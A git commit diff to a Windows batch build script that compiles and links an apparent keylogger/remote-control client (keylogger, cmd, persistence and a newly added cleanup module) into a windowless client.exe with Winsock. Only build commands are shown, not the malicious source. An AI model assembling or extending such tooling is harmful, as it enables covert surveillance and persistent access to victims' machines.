3c7df06e149a9f107c7770f01de8424b895b09c8
nst1340 <54483493+nst1340@users.noreply.github.com>
2024-03-03 19:53:42 -0500

    Update compile.bat

--- client/compile.bat
+++ client/compile.bat
@@ -5,8 +5,9 @@ g++ -c client.cpp
 g++ -c keylogger.cpp
 g++ -c cmd.cpp
 g++ -c persistence.cpp
+g++ -c cleanup.cpp
 
 echo Linking...
-g++ -o client.exe client.o cmd.o keylogger.o persistence.o -lws2_32 -mwindows
+g++ -o client.exe client.o cmd.o keylogger.o persistence.o cleanup.o -lws2_32 -mwindows
 
 echo Done.
